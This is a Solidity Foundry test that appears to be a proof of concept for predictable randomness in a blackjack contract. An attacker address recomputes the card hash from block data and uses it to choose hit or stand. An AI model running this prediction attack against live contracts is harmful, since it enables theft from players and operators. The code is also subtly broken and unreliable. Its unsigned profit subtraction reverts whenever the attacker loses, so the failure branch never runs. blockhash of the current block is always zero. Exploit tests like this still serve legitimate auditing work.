// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/blackjack.sol";

contract BlackJackTest is Test {
    BlackJack public blackjack;
    address public player = address(0x1);
    address public attacker = address(0x2);
    uint256 public constant BET_AMOUNT = 1 ether;

    function setUp() public {
        blackjack = new BlackJack();
        vm.deal(player, 10 ether);
        vm.deal(attacker, 10 ether);
    }

    function testBadRandomnessExploit() public {
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Attacker balance before attack:", attackerBalanceBefore);

        // Normal player plays a game
        vm.prank(player);
        blackjack.deal{value: BET_AMOUNT}();

        // Attacker can predict the cards because randomness is based on block data
        console.log("--- Trigger Attack ---");
        vm.startPrank(attacker);
        blackjack.deal{value: BET_AMOUNT}();

        // Attacker can manipulate the outcome by calling at specific blocks
        uint256 blockNumber = block.number;
        uint256 timestamp = block.timestamp;

        // Calculate predicted card with simplified expression to prevent compilation errors
        bytes32 blockHash = blockhash(blockNumber);
        bytes memory packedData = abi.encodePacked(blockHash, attacker, uint8(0), timestamp);
        uint256 hashValue = uint256(keccak256(packedData));
        uint8 predictedCard = uint8(hashValue % 52);

        // Attack decision based on predicted card
        if (shouldHitBasedOnPredictedCard(predictedCard)) {
            blackjack.hit();
        } else {
            blackjack.stand();
        }
        vm.stopPrank();

        console.log("--- AFTER-Trigger Attack ---");
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Attacker balance after attack:", attackerBalanceAfter);

        // Calculate actual profit/loss
        uint256 profitLoss = attackerBalanceAfter - attackerBalanceBefore;
        bool exploitSuccess = profitLoss > 0;

        console.log("Balance change:", profitLoss, "wei");
        console.log("Exploit result:", exploitSuccess ? "SUCCESS - Attacker gained ETH" : "FAILED - Attacker didn't gain ETH");
        
        // Final verdict based on balance change
        if (exploitSuccess) {
            console.log("Vulnerability Exist: Attacker successfully manipulated game outcome to steal ETH");
        } else {
            console.log("Vulnerability not Exist: Attacker failed to gain ETH through manipulation");
        }
    }

    function shouldHitBasedOnPredictedCard(uint8 card) internal pure returns (bool) {
        // Simplified strategy - hit if predicted card is favorable
        return card < 26; // Arbitrary threshold for demonstration
    }
}